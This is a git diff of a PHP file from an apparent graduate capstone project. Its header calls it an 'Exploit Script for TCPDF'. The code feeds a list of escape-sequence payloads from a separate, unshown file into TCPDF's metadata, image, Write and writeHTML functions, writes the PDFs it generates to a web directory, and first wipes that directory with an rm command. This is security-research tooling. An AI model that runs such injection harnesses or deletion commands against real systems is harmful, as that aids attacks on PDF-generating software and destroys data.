@@ -1,56 +1,127 @@
+<!-- File: index.php -->
+<!-- Assignment: MS Capstone -->
+<!-- Lanuguage: PHP -->
+<!-- Author: Sean Kells <spk3077@rit.edu> -->
+<!-- Description: Exploit Script for TCPDF -->
 <?php
-
 require_once __DIR__ . '/vendor/autoload.php';
 require './php_payloads.php';
 
-$pdf = new TCPDF();
-// $creator = <<<EOD
+// Wipe existing PDFs
+system("rm -r /var/www/myapp/pdfs/*.pdf");
 
-// endstream
-// endobj
-// EOD;
-// $pdf->SetCreator($creator);
-// $pdf->Output('/tmp/tcpdf.pdf', 'I');
+// Creator
+$i = 0;
+foreach ($escape_seq as $seq) {
+    $pdf = new TCPDF();
+    $pdf->AddPage();
+    $pdf->SetCreator($seq);
+    $pdf->Output('/var/www/myapp/pdfs/creator'.$i.'.pdf', 'F');
+    $i++;
+}
 
+// Author
+$i = 0;
+foreach ($escape_seq as $seq) {
+    $pdf = new TCPDF();
+    $pdf->AddPage();
+    $pdf->SetAuthor($seq);
+    $pdf->Output('/var/www/myapp/pdfs/author'.$i.'.pdf', 'F');
+    $i++;
+}
 
-// $pdf->SetAuthor('TCPDF Sean Kells');
-// $pdf->SetTitle('TCPDF Title');
-// $pdf->SetSubject('TCPDF Subject');
-// $pdf->SetKeywords('TCPDF, PDF, example, test, guide');
+// Title
+$i = 0;
+foreach ($escape_seq as $seq) {
+    $pdf = new TCPDF();
+    $pdf->AddPage();
+    $pdf->SetTitle($seq);
+    $pdf->Output('/var/www/myapp/pdfs/title'.$i.'.pdf', 'F');
+    $i++;
+}
 
-$pdf->AddPage();
+// Title
+$i = 0;
+foreach ($escape_seq as $seq) {
+    $pdf = new TCPDF();
+    $pdf->AddPage();
+    $pdf->SetSubject($seq);
+    $pdf->Output('/var/www/myapp/pdfs/subject'.$i.'.pdf', 'F');
+    $i++;
+}
 
-// // STREAMS
+// Keywords
+$i = 0;
+foreach ($escape_seq as $seq) {
+    $pdf = new TCPDF();
+    $pdf->AddPage();
+    $pdf->SetKeywords($seq);
+    $pdf->Output('/var/www/myapp/pdfs/keywords'.$i.'.pdf', 'F');
+    $i++;
+}
 
-// //  Image Stream
-// //  Data Stream Image Attempt ('@' character)
-// //  $imgdata = base64_decode('iVBORw0KGgoAAAANSUhEUgAAABwAAAASCAMAAAB/2U7WAAAABlBMVEUAAAD///+l2Z/dAAAASUlEQVR4XqWQUQoAIAxC2/0vXZDrEX4IJTRkb7lobNUStXsB0jIXIAMSsQnWlsV+wULF4Avk9fLq2r8a5HSE35Q3eO2XP1A1wQkZSgETvDtKdQAAAABJRU5ErkJggg==');
-// //  $pdf->Image('@'.$imgdata);
+// Direct Image Stream
+$imgdata = base64_decode('iVBORw0KGgoAAAANSUhEUgAAABwAAAASCAMAAAB/2U7WAAAABlBMVEUAAAD///+l2Z/dAAAASUlEQVR4XqWQUQoAIAxC2/0vXZDrEX4IJTRkb7lobNUStXsB0jIXIAMSsQnWlsV+wULF4Avk9fLq2r8a5HSE35Q3eO2XP1A1wQkZSgETvDtKdQAAAABJRU5ErkJggg==');
+$i = 0;
+foreach ($escape_seq as $seq) {
+    $pdf = new TCPDF();
+    $pdf->AddPage();
+    $pdf->Image('@'.$imgdata.$seq);
+    $pdf->Output('/var/www/myapp/pdfs/directimage'.$i.'.pdf', 'F');
+    $i++;
+}
 
-//  Image in File Directory
- $pdf->Image('images/dog.jpg', 15, 140, 50, 50, 'JPG', '', '', true, 150, '', false, false, 1, false, false, false);
+$i = 0;
+$path = "/var/www/myapp/images";
+if ($handle = opendir($path)) {
+    while (false !== ($file = readdir($handle))) {
+        if ('.' === $file) continue;
+        if ('..' === $file) continue;
+        $pdf = new TCPDF();
+        $pdf->AddPage();
 
-// //  $pdf->ImageSVG('images/dog.jpg', 15, 140, 50, 50, 'http://localhost.com');
-// //  Write TEXT 
-// // Likely no Adobe Illustrator Image File ImageEps()
+        // Get Extension of Image
+        $ext_option = "";
+        $ext = explode(".", $file);
+        $ext = strtolower($ext[count($ext) - 1]);
+        if ($ext == "jpeg" || $ext == "jpg") {
+            $ext_option = "JPEG";
+        }
+        elseif ($ext == "png") {
+            $ext_option = "PNG";
+        }
+        else {
+            $ext_option = "JPEG";
+        }
 
+        $pdf->Image("/var/www/myapp/images/".$file, 15, 140, 50, 50, $ext_option, '', '', true, 150, '', false, false, 1, false, false, false);
+        $pdf->Output('/var/www/myapp/pdfs/image'.$i.'.pdf', 'F');
+        $i++;
+    }
+    closedir($handle);
+}
 
-// $txt = <<<EOD
-// TCPDF Generated PDF
+// Write
+$i = 0;
+foreach ($escape_seq as $seq) {
+    $pdf = new TCPDF();
+    $pdf->AddPage();
+    $pdf->Write(0, $seq, '', 0, 'C', true, 0, false, false, 0);
+    $pdf->Output('/var/www/myapp/pdfs/write'.$i.'.pdf', 'F');
+    $i++;
+}
 
-// WRITE FUNC
-// EOD;
-// $pdf->Write(0, $txt, '', 0, 'C', true, 0, false, false, 0);
-
-// // $html = <<<EOD
-// // <h1>Like exploits? <a href="http://kellsrealwww.com" style="text-decoration:none;background-color:#CC0000;color:black;"></h1>
-// // <i>Couldn't tell</i>
-// // <p>This is writeHTMLCell() output</p>
-// // <img src="images/logo_example.png" alt="test alt attribute" width="100" height="100" border="0" /><img src="images/tcpdf_box.svg" alt="test alt attribute" width="100" height="100" border="0" /><img src="images/logo_example.jpg" alt="test alt attribute" width="100" height="100" border="0" />
-// // EOD;
+// WriteHTML
+$i = 0;
+foreach ($escape_seq as $seq) {
+    $pdf = new TCPDF();
+    $pdf->AddPage();
+    $pdf->writeHTML($seq, true, false, true, false, '');
+    $pdf->Output('/var/www/myapp/pdfs/writehtml'.$i.'.pdf', 'F');
+    $i++;
+}
 
 // // // output the HTML content
-// // $pdf->writeHTML($html, true, false, true, false, '');
 
 // // Language Array Injection?
 // $lg = Array();
@@ -94,7 +165,7 @@ $pdf->AddPage();
 // EOD;
 // $pdf->writeHTML($tbl, true, false, false, false, '');
 
-$pdf->Output('tcpdf.pdf', 'I');
+// $pdf->Output('tcpdf.pdf', 'I');
 // // $pdf->Output('/tmp/tcpdf.pdf', 'F');
 // ?>
 <h1 style="text-align:center;"> No Comments? Your PDF was created </h1>
